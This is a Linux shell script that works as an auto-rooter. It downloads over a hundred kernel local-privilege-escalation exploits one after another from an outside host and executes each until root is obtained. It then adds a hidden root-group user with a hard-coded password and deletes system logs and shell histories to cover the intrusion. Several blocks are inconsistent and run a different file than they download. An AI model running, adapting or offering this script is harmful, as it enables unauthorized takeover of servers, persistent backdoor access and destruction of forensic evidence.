#!/bin/bash

fcheck
()
{
	if [ $(whoami) = 'root' ] 2> /dev/null
then
		echo " [*] Got root!"
		GOTROOT=1
	fi
}

GOTROOT=''
mkdir exploits
cd exploits

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/1-2
	chmod 777 1-2
	./1-2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/1-3
	chmod 777 1-3
	./1-3
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/1-4
	chmod 777 1-4
	./1-4
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.18-374.12.1.el5-2012
	chmod 777 2.6.18-374.12.1.el5-2012
	./2.6.18-374.12.1.el5-2012
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/10
	chmod 777 10
	./10
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/11
	chmod 777 11
	./11
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/12
	chmod 777 12
	./12
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/14
	chmod 777 14
	./14
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/15.sh
	chmod 777 15.sh
	./15.sh
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/15150
	chmod 777 15150
	./15150
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/15200
	chmod 777 15200
	./15200
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/16
	chmod 777 16
	./16
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/16-1
	chmod 777 16-1
	./16-1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/18
	chmod 777 18
	./18
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/18-5
	chmod 777 18-5
	./18-5
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2
	chmod 777 2
	./2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2-1
	chmod 777 2-1
	./2-1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2-6-32-46-2011
	chmod 777 2-6-32-46-2011
	./2-6-32-46-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2-6-37
	chmod 777 2-6-37
	./2-6-37
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2-6-9-2005
	chmod 777 2-6-9-2005
	./2-6-9-2005
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2-6-9-2006
	chmod 777 2-6-9-2006
	./2-6-9-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.34-2011Exploit1
	chmod 777 2-6-9-2006
	./2-6-9-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.4.21-2006
	chmod 777 2-6-9-2006
	./2-6-9-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.4.36.92.6.27.5\ -\ 2008\ Local\ root
	chmod 777 2.4.36.92.6.27.5\ -\ 2008\ Local\ root
	./2.4.36.92.6.27.5\ -\ 2008\ Local\ root
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.18-164-2010
	chmod 777 2.6.18-164-2010
	./2.6.18-164-2010
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.18-194
	chmod 777 2.6.18-194
	./2.6.18-194
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.18-194.1-2010
	chmod 777 2.6.18-194.1-2010
	./2.6.18-194.1-2010
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.18-194.2-2010
	chmod 777 2.6.18-194.2-2010
	./2.6.18-194.2-2010
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.18-2011
	chmod 777 2.6.18-2011
	./2.6.18-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.18-274-2011
	chmod 777 2.6.18-274-2011
	./2.6.18-274-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.18-6-x86-2011
	chmod 777 2.6.18-6-x86-2011
	./2.6.18-6-x86-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.2-hoolyshit
	chmod 777 2.6.2-hoolyshit
	./2.6.2-hoolyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.20
	chmod 777 2.6.20
	./2.6.20
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.20-2
	chmod 777 2.6.20-2
	./2.6.20-2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.22
	chmod 777 2.6.22
	./2.6.22
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.22-2008
	chmod 777 2.6.22-2008
	./2.6.22-2008
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.22-6-86_64-2007
	chmod 777 2.6.22-6-86_64-2007
	./2.6.22-6-86_64-2007
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.23-2.6.24
	chmod 777 2.6.23-2.6.24
	./2.6.23-2.6.24
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.23-2.6.24_2
	chmod 777 2.6.23-2.6.24_2
	./2.6.23-2.6.24_2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.23-2.6.27
	chmod 777 2.6.23-2.6.27
	./2.6.23-2.6.27
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.24
	chmod 777 2.6.24
	./2.6.24
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.27.7-generi
	chmod 777 2.6.27.7-generi
	./2.6.27.7-generi
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.28-2011
	chmod 777 2.6.28-2011
	./2.6.28-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.32-46.1.BHsmp
	chmod 777 2.6.32-46.1.BHsmp
	./2.6.32-46.1.BHsmp
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.33
	chmod 777 2.6.33
	./2.6.33
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.33-2011
	chmod 777 2.6.18-2011
	./2.6.18-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.34-2011
	chmod 777 2.6.34-2011
	./2.6.34-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.34-2011Exploit1
	chmod 777 2.6.34-2011Exploit1
	./2.6.34-2011Exploit1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.34-2011Exploit2
	chmod 777 2.6.34-2011Exploit2
	./2.6.34-2011Exploit2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.37
	chmod 777 2.6.37
	./2.6.37
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.37-rc2
	chmod 777 2.6.37-rc2
	./2.6.37-rc2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.5_hoolyshit
	chmod 777 2.6.5_hoolyshit
	./2.6.5_hoolyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.6-34
	chmod 777 2.6.6-34
	./2.6.6-34
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.6-34_h00lyshit
	chmod 777 2.6.6-34_h00lyshit
	./2.6.6-34_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.6_h00lyshit
	chmod 777 2.6.6_h00lyshit
	./2.6.6_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.7_h00lyshit
	chmod 777 2.6.7_h00lyshit
	./2.6.7_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.8-2008.9-67-2008
	chmod 777 2.6.8-2008.9-67-2008
	./2.6.8-2008.9-67-2008
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.8-5_h00lyshit
	chmod 777 2.6.8-5_h00lyshit
	./2.6.8-5_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.8_h00lyshit
	chmod 777 2.6.8_h00lyshit
	./2.6.8_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9
	chmod 777 2.6.9
	./2.6.9
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-2004
	chmod 777 2.6.9-2004
	./2.6.9-2004
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-2008
	chmod 777 2.6.9-2008
	./2.6.9-2008
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-34
	chmod 777 2.6.9-34
	./2.6.9-34
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-42.0.3.ELsmp
	chmod 777 2.6.9-42.0.3.ELsmp
	./2.6.9-42.0.3.ELsmp
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-42.0.3.ELsmp-2006
	chmod 777 2.6.9-42.0.3.ELsmp-2006
	./2.6.9-42.0.3.ELsmp-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-55
	chmod 777 2.6.9-55
	./2.6.9-55
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-55-2007-prv8
	chmod 777 2.6.9-55-2007-prv8
	./2.6.9-55-2007-prv8
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-55-2008-prv8
	chmod 777 2.6.9-55-2008-prv8
	./2.6.9-55-2008-prv8
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9-672008
	chmod 777 2.6.9-672008
	./2.6.9-672008
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.9.2
	chmod 777 2.6.9.2
	./2.6.9.2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2.6.91-2007
	chmod 777 2.6.91-2007
	./2.6.91-2007
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2007
	chmod 777 2007
	./2007
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2009-local
	chmod 777 2009-local
	./2009-local
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2009-wunderbar
	chmod 777 2009-wunderbar
	./2009-wunderbar
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/2011 LocalRoot\ For\ 2.6.18-128.el5
	chmod 777 2011 LocalRoot\ For\ 2.6.18-128.el5
	./2011 LocalRoot\ For\ 2.6.18-128.el5
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/21
	chmod 777 21
	./21
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/3
	chmod 777 3
	./3
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/3.4.6-9-2007
	chmod 777 3.4.6-9-2007
	./3.4.6-9-2007
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/31
	chmod 777 31
	./31
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/36-rc1
	chmod 777 36-rc1
	./36-rc1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/4
	chmod 777 4
	./4
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/44
	chmod 777 44
	./44
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/47
	chmod 777 47
	./47
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/5
	chmod 777 5
	./5
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/50
	chmod 777 50
	./50
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/54
	chmod 777 54
	./54
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/6
	chmod 777 6
	./6
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/67
	chmod 777 67
	./67
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/7
	chmod 777 7
	./7
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/7-2
	chmod 777 7-2
	./7-2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/7x
	chmod 777 7x
	./7x
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/8
	chmod 777 8
	./8
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/9
	chmod 777 9
	./9
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/90
	chmod 777 90
	./90
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/94
	chmod 777 94
	./94
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget 'http://bie.nazuka.net/localroot/Linux_2.6(1).12'
	chmod 777 Linux_2.6\(1\).12
	./Linux_2.6\(1\).12
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/Linux_2.6.12
	chmod 777 Linux_2.6.12
	./Linux_2.6.12
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/Linux_2.6.9-joolyshit
	chmod 777 Linux_2.6.9-joolyshit
	./2.6.18-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/acid
	chmod 777 acid
	./acid
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/d3vil
	chmod 777 d3vil
	./d3vil
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/exp1
	chmod 777 exp1
	./exp1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/exp2
	chmod 777 exp2
	./exp2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/exp3
	chmod 777 exp3
	./exp3
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/exploit
	chmod 777 exploit
	./exploit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/full-nelson
	chmod 777 full-nelson
	./full-nelson
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/gayros
	chmod 777 gayros
	./gayros
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/lenis.sh
	chmod 777 lenis.sh
	./lenis.sh
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/local-2.6.9-2005-2006
	chmod 777 local-2.6.9-2005-2006
	./local-2.6.9-2005-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/local-root-exploit-gayros
	chmod 777 local-root-exploit-gayros
	./local-root-exploit-gayros
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/priv4
	chmod 777 priv4
	./priv4
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/pwnkernel
	chmod 777 pwnkernel
	./pwnkernel
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/root.py
	chmod 777 root.py
	./root.py
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/runx
	chmod 777 runx
	./runx
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/tivoli
	chmod 777 tivoli
	./tivoli
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/ubuntu
	chmod 777 ubuntu
	./ubuntu
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/vmsplice-local-root-exploit
	chmod 777 vmsplice-local-root-exploit
	./vmsplice-local-root-exploit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	wget http://bie.nazuka.net/localroot/z1d-2011
	chmod 777 z1d-2011
	./z1d-2011
	fcheck
fi

cd ..
rm -rf exploits

if [ $GOTROOT = 1 ] 2> /dev/null
then
	RUSER='somesecguy'
	RPASS='g0tr00t'
	echo '[*] Adding root user..'
	adduser -g 0 $RUSER -G wheel,sys,bin,daemon,adm,disk -d /sf7 -s /bin/sh
	passwd $RPASS
	echo
	echo "[*] Added root user $RUSER with password $RPASS"
	echo "[*] Clearing logs.."
	rm -rf /tmp/logs 2> /dev/null
	rm -rf /root/.ksh_history 2> /dev/null
	rm -rf /root/.bash_history 2> /dev/null
	rm -rf /root/.bash_logout 2> /dev/null
	rm -rf /usr/local/apache/logs 2> /dev/null
	rm -rf /usr/local/apache/log 2> /dev/null
	rm -rf /var/apache/logs 2> /dev/null
	rm -rf /var/apache/log 2> /dev/null
	rm -rf /var/run/utmp 2> /dev/null
	rm -rf /var/logs 2> /dev/null
	rm -rf /var/log 2> /dev/null
	rm -rf /var/adm 2> /dev/null
	rm -rf /etc/wtmp 2> /dev/null
	rm -rf /etc/utmp 2> /dev/null
	GOTROOT=''
	echo "[*] You g0t r00t, horray for you..."
else
	echo "[*] You didn't g0t r00t, sucks to be you..."
fi
